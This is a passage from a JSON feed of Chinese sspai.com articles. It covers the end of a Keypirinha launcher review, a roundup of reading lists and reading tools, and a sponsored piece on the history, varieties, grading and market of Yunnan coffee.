target=\"_blank\">API</a>，有能力的读者可以构建属于自己的扩展。</p>\n<h2>总结</h2>\n<p>在此软件之前我也尝试过其他的启动器，它们要么想要做的事情太多，动辄几百 MB 的内存占用，电量和资源消耗惊人；要么长久不维护，上一次的更新可能是 4 年前。Windows 自带搜索的体验则是一言难尽，除了突发性白屏和罢工，还要忍受微软愈加放肆的垄断策略。</p>\n<p>Keypirinha 在功能丰富程度上并不如一些竞品，但已有的功能完全能满足「搜索」和「启动」两项任务。毕竟在当下的大众市场中，数字工具们或迫于盈利需要与营销策略，或迫于同类产品的压力，像 Keypirinha 这样节制的似乎已经不多了。</p>\n<h2>相关链接</h2>\n<ul>\n<li>Keypirinha 下载和使用文档：https://keypirinha.com/</li>\n<li>部分第三方扩展列表：https://keypirinha.com/contributions.html</li>\n<li>Keypirinha 主题制作：https://ricardof.dev/keypirinha-theme-builder</li>\n<li>本文作者的配置文件（Keypirinha.ini）：https://gist.github.com/irtle/422f41487ca122400163e95e0ea125f0</li>\n</ul>\n<p>题图背景来自：<a href=\"https://unsplash.com/@leakingh?utm_source=unsplash&amp;utm_medium=referral&amp;utm_content=creditCopyText\" target=\"_blank\">White</a> on <a href=\"https://unsplash.com/s/photos/pc?utm_source=unsplash&amp;utm_medium=referral&amp;utm_content=creditCopyText\" target=\"_blank\">Unsplash</a></p>\n<p>&gt; 下载 <a href=\"https://sspai.com/page/client\">少数派 2.0 客户端</a>、关注 <a href=\"https://sspai.com/s/J71e\">少数派公众号</a>，解锁全新阅读体验 📰</p>\n<p>&gt; 实用、好用的 <a href=\"https://sspai.com/mall\">正版软件</a>，少数派为你呈现 🚀</p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/68546"},{"title":"开学季 | 想多读点书没那么难，你可以从这些地方入手","date":"2021-08-31 07:28:36","description":"\n<p>随着新学期的开始，不少同学都要重启每年一次的「『我这学期一定要读够 X 本书』大型立志计划」了。但真到了决定读点什么的时候，却总因为没有具体阅读目标而最终放弃。在这篇文章中，我们为你整理了我派此前发表过的各类书单相关作品，以及和读书相关的好文章，希望可以帮你找到阅读目标，早日「破万卷」。</p>\n<h2>读一本书，就是为了打开一个新世界</h2>\n<p>2020 年，我派组织了一次「读书月」征文活动，征集了大量和阅读相关的优秀作品。令编辑部感到惊喜的是，这次的作者们没有将眼光限定在科技领域，相反，征文中出现了大量设计、音乐、时尚、计算机等领域的好书推荐，还包含了特立独行、「不务正业」的奇趣作家和作品。</p>\n<span class=\"ss-linkCard\" link-card-href=\"https://sspai.com/post/60734\"> </span><p>在本次征文活动中，获得最终大奖的是五篇别出心裁、立意有趣的作品，它们和传统的「列书单」式文章不太一样，每一篇都有独特的关注点和解析作品的方式，能带你踏入不同领域，感受文字世界的神秘和多彩。这五篇作品分别是：</p>\n<ul>\n<li><a href=\"https://sspai.com/post/60431\" target=\"_blank\">「琼瑰非宝，尺牍成珍」，阅读文学名著需要跨越多少门槛？——兼陀思妥耶夫斯基作品推荐</a></li>\n<li><a href=\"https://sspai.com/post/60591\" target=\"_blank\">「手稿是烧不掉的」—— 在布尔加科夫生辰之际，重读《大师和玛格丽特》</a></li>\n<li><a href=\"https://sspai.com/post/60346\" target=\"_blank\">书单推荐：存在主义也许可以缓解你对生活的焦虑</a></li>\n<li><a href=\"https://sspai.com/post/60524\" target=\"_blank\">初读《千面英雄》，流行文化与古老神话的统一</a></li>\n<li><a href=\"https://sspai.com/post/60440\" target=\"_blank\">走，去西部，那里大漠辽阔丨读书征文</a></li>\n</ul>\n<p>所有入围的文章还做成了专题页面，你可以在这里发现更多好书：<a href=\"https://sspai.com/topic/283\" target=\"_blank\">读书月入围书单合集</a></p>\n<h2>从年度书单里，选出你更喜欢的那一本</h2>\n<p>在此前的「不读可以先收藏」栏目中，我们就推荐过这篇书单。书单中汇总了十份各平台年度书单里的精华内容，并就每个品类进行了筛选，可谓汇集了各家之长。书单本身品质很高，作者的文笔也相当不错，即使仅参看每本书的介绍，依然引人入胜。</p>\n<blockquote>\n<p>2020 年，大家可能都过得不太容易，疫情之下，我们与世界失去联结，与亲密的人走散，经过悲痛和苦忧的那些夜晚，我们还能做些什么？方舱医院的那名患者给出了最安静而有力量的答案：阅读。</p>\n<p>年底时，豆瓣如往常一样给出一沓厚厚的年度书单，但条目之多、分类之细，让我连购物车都加不过来，于是我决定「走出去」逛逛，还有没有别家的书单可以参考呢？于是我找到了包括理想国、界面、社科文学社、上海文艺社、译著联合、方所、多抓鱼等 10 份书单，在其中果然发现了一些好书。</p>\n<p>在这篇文章中，我将按照「屡次上榜的好书」和「我的私人推荐」这两部分向大家介绍 16 本值得一看的书。</p>\n</blockquote>\n<span class=\"ss-linkCard\" link-card-href=\"https://sspai.com/post/64664\"> </span><h2>就算业余时间少，也有好书可读</h2>\n<p>现代人类凡事都追求速度和效率，读书也不例外。很多人主观上想读书，但抽不出时间来读。在这篇文章中，少数派的作者和编辑们筛选了许多七天就能读完的书，它们大多篇幅不长，内容也不晦涩，但内容依然足够精彩。这篇文章的立意虽然是「放假七天就能读完的书」，但同样适用于学业繁忙、没有太多时间读闲书的大忙人们。</p>\n<p>在荐书的同时，参与文章的作者们还顺便谈了谈自己的选书渠道和读书技巧，即使没有图书推荐，他们的读书心得依然值得一读。</p>\n<blockquote>\n<p>@ElijahLee：</p>\n<p>2021 年初，<a href=\"https://sspai.com/post/64716\" target=\"_blank\">iHour</a> 推出了 3.0 版本，我也是被它的设计理念「10000 小时」理论吸引，开始利用专注计时来养成专注阅读的习惯。目前我每天的目标是保持专注阅读 30 分钟，当然不忙的情况下每天我都能完成 2–3 个 30 分钟阅读目标。（算算看，每天 30 分钟需要 54 年才能达到 10000 小时，太遥远了😱）</p>\n<p>iHour 可以设置专注时禁用手机、环境音、在计时结束后提醒，以及中途打断仍能统计完成的那部分时间。我觉得会对专注阅读这项习惯的养成会有帮助。</p>\n<p>另外推荐我自己做的 <a href=\"https://www.icloud.com/shortcuts/e29d5beb46d4462f8ce2553886008bef\">快捷指令</a>，它能把豆瓣读书上的书籍添加到 Things 里，方便制作读书清单。具体的操作是在豆瓣 app 的书籍页面，点击右上角打开分享页面，选择快捷指令，就能自动抓取书名和作者，添加到 Things 里。</p>\n</blockquote>\n<span class=\"ss-linkCard\" link-card-href=\"https://sspai.com/post/65094\"> </span><h2>善用豆瓣，但不依赖豆瓣</h2>\n<p>「豆瓣书单」是许多爱读书的同学一定会参考的书目，而这篇文章则另辟蹊径，专门寻找豆瓣书单以外的好书。文章中汇总了来自各家出版社的优秀作品，以及几家独立书店的年度图书推荐，换一个新角度，也能找到一些新作品。</p>\n<blockquote>\n<p>豆瓣读书刚刚发布了包含 180 本书的「<a href=\"https://www.douban.com/note/746390013/\">年度读书榜</a>」，《新京报》也公布了有足足 120 本书籍入选的「<a href=\"http://h5.dangdang.com/mix_20191213_jjn3?unionid=p-112636143m\">年度阅读盛典</a>」，展现了媒体的荐书视角。</p>\n<p>而在这篇文章中，我们收集了「从业者」的年度书单，不论是将书籍带到这个世上的「做书人」，还是分布在各个城市的独立书店，他们对书籍的热爱简单而纯粹，也有独特的品味和视角。</p>\n<p>陈冠中说，读者走入一家好书店，就可以很随机地改变自己的知识结构。一份好的书单也是一样，它能让你在不长的篇幅中与不同的选题和内容不期而遇，读者可以自然地拓宽自己阅读的边界。希望在这些简短但有力量的书单中，你可以与更多智慧和思考相遇。</p>\n</blockquote>\n<span class=\"ss-linkCard\" link-card-href=\"https://sspai.com/post/58218\"> </span><h2>既要读书，也要思考阅读的意义</h2>\n<p>有人会一头扎进书的海洋里，也有人会跳出圈外，思考阅读的意义。在这篇《没空读书的一年里，我开始重新思考「读书」这件事》中，作者就完整、系统地梳理了和读书相关的林林总总，譬如读电子书还是实体书、如何选择阅读的类型、是要精读还是泛读等。在阅读优美的文字之余，站在更客观的角度跟着作者一起思考这些问题，也许可以帮你更深入和全面地看待读书这件事。</p>\n<blockquote>\n<p>去年一年，自己读书很少，实在是羞愧。但读书少的原因，一是因为太忙，二则是渐渐发现了「不读书」的好处。实际上，在「不读书」的一年，我对读书有了更多的思考。</p>\n<p>这篇文章从 2020 年末开始动笔，断断续续写了有三个月，算是对自己多年读书经验的总结。文章将读书的问题分为「应不应该读」「要不要读」「应该读什么」「应该怎样读」四个方面，篇幅足足有一万字。</p>\n<p>在知识面前，我们永远都是小孩子。</p>\n</blockquote>\n<span class=\"ss-linkCard\" link-card-href=\"https://sspai.com/post/66152\"> </span><h2>要多读书，也要掌握更科学的读书笔记法</h2>\n<p>一个完整的读书过程不仅要读，还要进行批注、记录和回顾。在这篇读书札记方法论中，作者介绍了使用归纳法做读书札记的方法和流程。从阅读中的标重点、做标记到读后的复盘和输出，使用作者提供的方法，可以更加完整地「吃透」一本书，抓住书中的要点于精华。</p>\n<blockquote>\n<p>「读书破万卷，下笔如有神。」但现实往往是，书读得不少，笔记记得挺多，可读便只是读了、记便只是记了，混乱不堪，缺乏整理，到用时根本无从下手。</p>\n<p>破局之路有二，一是压减读书的规模，从原先多读、泛读，到少读、精读；二是将笔记与书剥离，单独放置，形成「读书札记」，便于检索。既然要写读书札记，就意味着将书本转化成为己所用的素材，因而，要运用创造力和主观能动性，要本着「一千个读者眼中有一千个哈姆雷特」的精神，从有意义、有效用、能执行的角度对原书进行阐释或解读（interpreting）。最终形成的读书札记，自然要切中肯綮，避免在繁复的论证过程上浪费笔墨。</p>\n</blockquote>\n<span class=\"ss-linkCard\" link-card-href=\"https://sspai.com/post/62718\"> </span><h2><strong>这些工具，帮你更好地阅读</strong></h2>\n<p>除了读书本身，许多朋友还希望借助一些工具来完成笔记记录、阅读追踪、大纲整理等工作，而工具推荐正是我派作者们最擅长的写作领域。在这个版块中，我们聚合了和阅读相关的 app 及工具推荐，它们可以让你的阅读体验更加高效和顺利。</p>\n<h3>文字识别、思维导图、便签收纳⋯⋯它们让做读书笔记更高效</h3>\n<p>我派人气作者曹将老师总结了几个他在读书时会用到的 app，借助它们，我们可以非常方便地找到合适的书单，整理出不错的读书笔记，还能绘制出赏心悦目的思维导图。</p>\n<span class=\"ss-linkCard\" link-card-href=\"https://sspai.com/post/35901\"> </span><h3>有了阅读记录，才能养成更持久的阅读习惯</h3>\n<p>培养阅读习惯一直是许多人的美好愿望，但总缺少一些工具和契机来将愿望落地。这篇文章中介绍的这款名为《阅读记录》的应用就专门为建立和追踪阅读习惯而生，既可以用来管理阅读进度，也能通过阅读日历来直观地查看自己坚持阅读的情况，逐渐养成并坚持爱读书的好习惯，将阅读变成生活的一部分。</p>\n<span class=\"ss-linkCard\" link-card-href=\"https://sspai.com/post/63003\"> </span><h3>书中那些谨言妙句，用它管理更方便</h3>\n<p>每当你读到书中的好句子和好段落，总想记录下来，并在之后回溯或分享，下面的这款《众山小读书笔记》就侧重于读书笔记的管理和维护。你可以用它来导入 Kindle、微信读书等阅读器里的笔记，并集中管理阅读数据。有吸收也有输出，这才是一个完整的阅读流程。</p>\n<span class=\"ss-linkCard\" link-card-href=\"https://sspai.com/post/67271\"> </span><p>&gt; 下载 <a href=\"https://sspai.com/page/client\">少数派 2.0 客户端</a>、关注 <a href=\"https://sspai.com/s/J71e\">少数派公众号</a>，解锁全新阅读体验 📰</p>\n<p>&gt; 实用、好用的 <a href=\"https://sspai.com/mall\">正版软件</a>，少数派为你呈现 🚀</p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/68331"},{"title":"国物馆 | 中国咖啡看云南，这是我们自己的「咖啡王国」","date":"2021-08-31 06:29:55","description":"\n<h4><strong>编者注：</strong></h4>\n<p>在对消费者需求不断探索与「为国民，造好物」品牌理念的加持下，<a href=\"https://www.aigo.com/\" target=\"_blank\">aigo</a> 将现代年轻消费者的个性心理与传统文化巧妙结合，力求为大家带来更多时尚、潮流、有现代科技感、技术应用快人一步、高品质且价格友好的产品——而有着与之相同愿景的国货品牌亦不胜枚举。</p>\n<p>我们支持国际化潮流并主张消费自由，但不少平价好用的国货同时也正在被生生埋没，成为你购物车中不曾有过的遗珠之憾。于是少数派联合我们的好朋友 <a href=\"https://www.aigo.com/\" target=\"_blank\">aigo</a> 一起开启了这次国货推荐的征文活动，邀请了一些作者来分享他们使用下来认为不错的国货，在予你受用的同时也希望借此机会让更多的国货被看见。如果你也有心仪的国货想要推荐，非常欢迎你向我们投稿。</p>\n<hr>\n<p>云南种植咖啡的历史其实很悠久了，但个人认为从 2019 年开始才有了突飞猛进的发展，可以说是从量变到质变的过程。</p>\n<p>这篇文章，我的本意是带大家了解一下云南咖啡的发展历史以及现状。顺便推荐一些值得尝试的云南咖啡豆。</p>\n<h2>咖啡分布</h2>\n<p>在咖啡种植产业中，北纬 25° 至南纬 25° 形成了一条咖啡带，全球有  79个国家和地区种植咖啡。其中小粒种咖啡（Arabica）主要集中在高纬度高海拔凉爽地区，中粒种咖啡（Robusta）主要集中在低纬度低海拔高温高湿地区。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/27/04e36da32ad099804cc8cddcaff0a5d4.png\"></figure><p>而在亚洲中国除了台湾外，还有云南、海南等地种植咖啡豆。其中中国大陆主要的咖啡产地在云南。</p>\n<p><i>PS：我并不知道为什么中国非要定义个小粒咖啡、中粒咖啡，有知道的欢迎补充！</i></p>\n<h2>云南咖啡史</h2>\n<p>这是一份简单的云南咖啡历史年表，我们可以从年表中大致看到咖啡与中国的缘分，从 132 年前就开始了。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/08/27/ae33ec07605fbe06b29e5d82f4e61a9d.png\"></figure><p>在这份中国咖啡史年表中，需要单独补充一点。</p>\n<p>上世纪 80 年代末期雀巢咖啡在中国成立合资公司，通过启动咖啡种植项目等方法开始在云南支持当地咖啡产业发展，云南咖啡再次崛起。1992 年起，雀巢成立咖啡农业部，专门指导、研究云南咖啡的改良与种植，并按照美国现货市场的价格收购咖啡。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/27/e8e8e87f0a6386636d677cd1de3d7f87.png\"></figure><p>随后，星巴克、卡夫、麦氏均在云南建立工厂收购咖啡豆。虽然可以直接解决咖啡豆的收购问题，但咖农们都面临着价格打压的问题，咖农其实并没有得到应有的实惠。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/27/8f17419de7e2cee8b7006d1363534f15.png\"></figure><p>2019 年上半年受全省性干旱天气影响，各主产区咖啡均受到不同程度毁损，部分咖啡树干死或只开花不结果，加上咖啡价格连续多年持续走低，咖农无心管理，咖啡产量受到一定影响，有的咖农看不到希望，把已经可以挂果的咖啡树全部砍掉，改种了其他经济作物。</p>\n<h2>云南咖啡种植概述</h2>\n<p>国际上种植咖啡需要满足海拔、气候、降雨量、风、日照时间、土壤等条件。</p>\n<h3>基本种植条件</h3>\n<p>温度介于 15-25℃ 之间的温暖气候，而且整年的降雨量必须达 1500-2000 毫米，同时其降雨时间，要能配合咖啡树的开花周期。当然，除了季节和雨量的配合外，还要有肥活的土壤。最适合栽培咖啡的土壤，是排水良好，含火山灰质的肥活土壤。</p>\n<p>另外，日光虽然是咖啡成长及结果所不可欠缺的要素，但过于强烈的阳光会影响咖啡树的成长，故各个产地通常会配合种植一些遮阳树，一般多种植香蕉、芒果以及豆科植物等树干较高的植物。</p>\n<p>而对于中国环境来说，需要满足：</p>\n<ul>\n<li>海拔宜在 800～1200 米之间。</li>\n<li>低于 800 米也可以种植，最理想种植应该是 800—1200 米之间。</li>\n<li>年平均气温为：17~23℃，极端最低温度不能小于 0℃ 的地块为种植标准，一般海拔升高 100 米，气温下降 0.65℃。</li>\n<li>Arabica 为浅根系植物，要求土壤肥沃疏松，排水良好，地下水位 1 米以下，PH 值 5.5-6.5 为最适，小于 4.5 或大于 7.8 均不能种植，；在气温高的地方选择北坡或阴坡，在气温较低的地方选择南坡或阳坡，一般咖啡园温度不宜超过 25 度；对雨量的要求为降雨充足，年降雨量为 1000 毫米以上，且全年分配较均匀。</li>\n</ul>\n<h3>云南咖啡品种</h3>\n<p>1991 年前，云南咖啡主要栽培铁皮卡（Typica）和波旁（Bourbon）这两个经典的优质咖啡品种，之后又从肯尼亚引入了卡蒂姆（Catimor）系列品种（抗病毒能力更强，产量更高）。由于这两个品种形态和习性相似，因而两者多混合栽培。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/27/5bd72351d2881918f5dd555eb1fe787e.png\"></figure><p>云南地区目前种植最广泛的就是卡蒂姆（catimor），保山地区还有少量铁皮卡（typica），波旁（bourbon）种植。虽然从大的范围上都属于阿拉比卡种，但这几个品种在本质上还是有着很大的区别的。</p>\n<p><strong>铁皮卡（typica）：</strong>最经典的阿拉比卡种，目前很多商业改良种都源自此种。味道表现极佳，是公认的精品咖啡品种，但是产量极低而且易受锈蚀病的侵蚀，需要投入更多的人力管理。铁皮卡咖啡原产于埃塞俄比亚及苏丹的东南部，是西半球栽培最广的咖啡变种。植株较健壮，但不耐光照，在夏威夷产量较高。铁皮卡顶叶为红铜色，称红顶咖啡。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/08/27/1434be68516851ef4294f144a143271c.png\"></figure><p><strong>波旁（bourbon）：</strong>该品种源自铁皮卡，由法国人于 1708 年在波旁岛（现名留尼汪岛）种植后扩展开来。波旁同样有着美好的香气和丰富的味道，较之铁皮卡在产量和生长力上都要高一些，适合种植在 1200——2000 米的地区，但是抗病虫能力较弱，而且对强风和强降水比较敏感。波旁是小粒咖啡中仅次于铁皮卡的变种。主枝最初和主干呈 45 度向上生长，随果实负荷下垂，侧枝节部较密，结果多，产量较高。但浆果较小，成熟较慢。 波旁顶芽嫩叶为绿色，称绿顶咖啡。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/27/b37b028e4ad655832af2557f0ed9ed25.png\"></figure><p><strong>卡蒂姆（catimor）：</strong>卡蒂姆并不是纯粹的阿拉比卡血统，它是Timor种（属于罗伯斯塔种）和卡杜拉（caturra）（波旁种的变种）的杂交种，所以卡蒂姆（catimor）有着25%的罗伯斯塔血统，而它的罗伯斯塔血统也决定了它的味道缺陷：香气不够丰富，而且整体味道苦味重，易出现涩味和比较刺激的霉味。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/08/27/c7e99c03423320f6881e75d856ca1c30.png\"></figure><p>云南普洱地区种植的全部是卡蒂姆（catimor）品种，保山市早在上世纪 50 年代引入的是铁皮卡（typica）和波旁（bourbon），当地人称之为「老品种」，因为老品种抗病虫能力及产量都比较低，而且管理上比较费人力，加之市场收购价并不存在多少优势，近年来啡农纷纷改种新品种卡蒂姆（catimor）。</p>\n<h3>云南咖啡主要产区</h3>\n<p>云南为全国最大的咖啡种植区，主要种植在普洱、西双版纳、文山、保山、德宏、临沧等地。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/08/27/7e144688cfaf9886f08f3fd25679872c.png\"><figcaption>图片来源：云南省咖啡行业协会</figcaption></figure><h4>临沧</h4>\n<p>临沧市位于云南省西南部，北回归线横贯南部，东邻普洱，北连大理，西接保山，西南与缅甸交界，因濒临澜沧江得名，是祖国西南边陲一颗璀璨的明珠。临沧常年平均气温在  16.8℃―17.2℃ 之间，干湿季明显，日照充足。</p>\n<h4>德宏州</h4>\n<p>中国咖啡诞生地，该地区海拔 1,000 至 1600 米，占地 2000 公顷的咖啡种植园。更重要的是，大多数咖啡都是在这里有机种植，使其成为世界上最优质的咖啡之一。</p>\n<h4>普洱</h4>\n<p>咖啡之都，2012 年，普洱种植面积为 43,433 公顷，咖啡收获面积为 18,000 公顷，年产咖啡 36,500 吨，其中出口咖啡 24,700 吨。普洱咖啡行业有 70 家注册企业，3 万户家庭和约 100 万人口。普洱茶被誉为「千年茶之城」，是中国重要的咖啡产区，种植面积最大，产量最高，质量最好，也是国际咖啡业务的重要集散地。</p>\n<h4>保山</h4>\n<p>小粒咖啡是保山最为出名的咖啡，该咖啡在 20 世纪 50 年代末迈出了第一步，很快得到了伦敦的积极反馈，1980 年的全国咖啡会议上公认其为「全国咖啡之冠」， 2010 年 12 月，保山小粒咖啡获得 A 级认证，并通过中国国家标准管理局流程，被认为是反映中国国家地理标志产品。</p>\n<h3>云南咖啡分级方式</h3>\n<p>生豆外观要求具有光泽（浅蓝色或浅绿色），气味清新，无酸味和臭味等异味，圆形或椭圆形。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/27/3ddbaa7d921bafb22291b9198a3a266d.png\"><figcaption>卡蒂姆AAA</figcaption></figure><h4><strong>国内咖啡常用分级标准</strong></h4>\n<p>按筛孔 6.5、6.0、5.5、5.0 毫米分为五级：</p>\n<ul>\n<li>一级：6.5 毫米以上，颗粒饱满完整</li>\n<li>二级：6.0-6.4 毫米，饱满，较均齐</li>\n<li>三级：5.3-5.9 毫米，较饱满，稍欠均齐</li>\n<li>四级：5.0-5.4 毫米，有不完整米，完整占 75% 以上</li>\n<li>五级：5.0 毫米以下，有不完整米，完整占 30% 以上</li>\n</ul>\n<p>色泽：具有光泽、浅蓝、浅绿、浅白为好。黑褐色、暗桔色为次：</p>\n<ul>\n<li>一级：浅蓝、浅绿、浅白、浅黄、色泽均匀</li>\n<li>二级：浅蓝、浅绿、浅白、浅黄、色泽稍差</li>\n<li>三级：浅蓝、浅绿、浅白、浅黄、色泽更差</li>\n<li>四级：稍黄、少量褐色</li>\n<li>五级：色花杂</li>\n</ul>\n<p><strong>净度：</strong>不含杂质或含少量杂质为好：</p>\n<ul>\n<li>一级：脱去银皮 70% 以上，无杂质</li>\n<li>二级：脱去银皮 65% 以上，无杂质</li>\n<li>三级：脱去银皮 60% 以上，无杂质</li>\n</ul>\n<p><strong>气味：</strong>发酵变坏，淡红、褐色为酸味，酸臭或其他异味为不好。</p>\n<p><strong>水份：</strong>含水量不超过12%。</p>\n<p>以上标准是一个分类框架及要求，到了 YCE 时期，结合 SCA 和 CQI 体系，对传统水洗处理法的小粒咖啡规划了新的一套分级体系。如下图：</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/08/27/f99653b462408db6e1fe2b739ed1e4e0.png\"><figcaption>此标准是在 2019 年 11 月 1 日修订，2019 年 12 月 1 日执行的。现在 YCE 的传统水洗咖啡生豆，均按照此标准进行分级、报价。</figcaption></figure><figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/08/27/f428f9aa100f2353a09b896aa5ad0559.png\"><figcaption>此标准是在2019年11月1日修订，2019年12月1日执行的。现在YCE的传统水洗咖啡生豆，均按照此标准进行分级、报价。</figcaption></figure><h2>咖啡的生长过程</h2>\n<p>给大家简单介绍一下，咖啡从种子到采收的简单过程。体会一下咖啡农的不易。</p>\n<p>云南小粒咖啡 4 年左右可以成长为结果的咖啡树。</p>\n<p>咖啡是一种短日照植物。咖啡具有多次开花现象及花期集中的特性。小粒种咖啡在云南花期 2~7 月，盛花期 3~5 月。咖啡的开花受气候，特别是雨量和气温的影响较大。咖啡花寿命短，只有 2~3 天的时间。小粒种咖啡一般在清晨 3~5 时初开，5~7 时盛开。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/27/789ab59a13baad5b58b86c789f7c61bd.png\"></figure><p>咖啡果实发育时间较长。小粒种咖啡果实成熟需 8~10 个月一般在当年的 10~12 月成熟。雨量对果实发育的影响较大，气候条件直接影响果实的发育。</p>\n<h3><strong>第一阶段：建设大棚</strong></h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/27/579ff8f7058862ae3f5c956cae0bac0f.png\"></figure><p>建好大棚后，开始播种，之后等待种子发芽。</p>\n<h3><strong>第二阶段：育苗</strong></h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/27/6f142ba0975de9ff2d6524fa6100ec58.png\"></figure><p>当长出豆芽后，就进行移盆单独培育，对一些成长状态不错的树苗进行修根假植。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/27/141c9719babd473b085e538e00b914b4.png\"></figure><h3><strong>第三阶段：幼苗期防疫</strong></h3>\n<p>这阶段主要对隔年的咖啡树幼苗进行病虫害防治以及幼苗切根</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/27/6e4d1b0e1e81543fdca354ff57ce17ea.png\"></figure><h3><strong>第四阶段：种植</strong></h3>\n<h4>选地与开垦</h4>\n<p>海拔：800-1200 米之间，年降雨量大于 1250 毫米，年平均温度 19-21℃，冬季无霜、静风的环境。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/08/27/95236cc549e7943e7d8192b4bc31fa91.png\"></figure><p>坡度：小于 25°，土层深度 1 米以下，且疏松肥沃，阳离子交换量大于 10me%；PH 值 5.5-6.5；</p>\n<p>水源：水源充足且交通方面。</p>\n<h4>定值</h4>\n<p>定值时间：最佳时间为 6-7 月份。</p>\n<p>定值苗木的标准：苗圃中的幼苗长到有 4-5 对针叶时，即可出圃定值。</p>\n<p>定值方法：根据种植的品种确定株距（一般卡蒂姆为 1.2 米）；然后沿台地的中心线（即定值沟中心线）挖定值穴（30x30x30cm）</p>\n<h3><strong>第五阶段：采收</strong></h3>\n<p>云南咖啡树，一般都种在类似「梯田」形式的土坡上，一层层错落，因此地形不适合机械进入采收，所以都采用人工方式进行采收。</p>\n<p>人工方式采收的好处就是可以进行全红果采收，品质可以保证。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/27/9d747662ea5fd8aa3ce56b97a2cd9beb.png\"></figure><p>因此人工采收效率很低，咖农也很辛苦。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/27/8b45ca73cd75458394fabebe0552dd1a.png\"></figure><h3><strong>第六阶段：处理</strong></h3>\n<p>在采收的最后，就是处理咖啡生豆，选择不同的处理法，一般云南水洗法比较多，近两年开始，有了很多特殊处理法比如红酒处理、厌氧处理等。</p>\n<h2>云南咖啡的发展现状</h2>\n<p>云南咖啡产业发展具有优秀的种植条件，产业发展历史悠久，咖啡全产业链体系较为完整。但在全球范围内，云南咖啡出口仍处于产业链上游，未来还需要实现产业升级、推行标准化生产、提高咖啡品质，加大品牌建设、宣传。</p>\n<p>根据农业部统计，2018 年全国咖啡总面积 184.05 万亩，居全球第 21 位，其中云南咖啡面积占全国的 99.22%，海南占 0.37%，四川占 0.16%。2019年云南省咖啡种植面积达 156.73 万亩，同比增长 4.88%，占全国咖啡产业种植面积的 99% 以上。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/27/a2fc28ab2271acb150260e5e0f03cfef.png\"><figcaption>图片来源：前瞻产业研究院</figcaption></figure><p>从省内区域看，2019 年全省咖啡种植面积 156.73 万亩，主要分布在普洱市、临沧市、保山市、德宏州、西双版纳州等 8 州市的 31 个县（区、市）。其中普洱市 78.5 万亩、临沧市 42.25 万亩、保山市13.65 万亩、德宏州 11.3 万亩、西双版纳州 9.47 万亩。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/27/fdb8ab402a06e55d26702077a89bd8f0.png\"><figcaption>数据来源：云南省咖啡协会</figcaption></figure><h3>产量情况</h3>\n<p>据历年统计，2001～2009 年全省咖啡总产量平稳增长，2010～2016 年全省咖啡总产量呈快速增长态势，2016～2018 年，全省咖啡总产量受市场价格影响有所下降。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/27/5807ba87f2328db6c58c30c6b6e59460.png\"><figcaption>云南省咖啡总产量发展趋势（2001-2018年）</figcaption></figure><p>2019 年上半年受全省性干旱天气影响，及其他因素影响，全省咖啡产量预计 13 万吨左右。</p>\n<h3><strong>价格情况</strong></h3>\n<p>2019 年上半年，云南省咖啡平均价格约 13 元/kg，较上年下降12%，仍低于 15.00 元/kg 成本价，较 2011 年最高价格（25.29 元/kg）减少近 50%，为 2011 年以来最低价；11～12 月，咖啡价格 呈上升态势，雀巢公司云南报价 17～20 元/kg，预计 2019/2020 年咖啡价格会有所回升。</p>\n<p>我回顾了云南国际咖啡交易中心 2020 年 12 月 1 日的咖啡豆报价：</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/08/27/8d590a23557a60d9cfae15391fdaf797.png\"></figure><p>下面这张图是 2021 年 8 月 25 日的咖啡报价：</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img 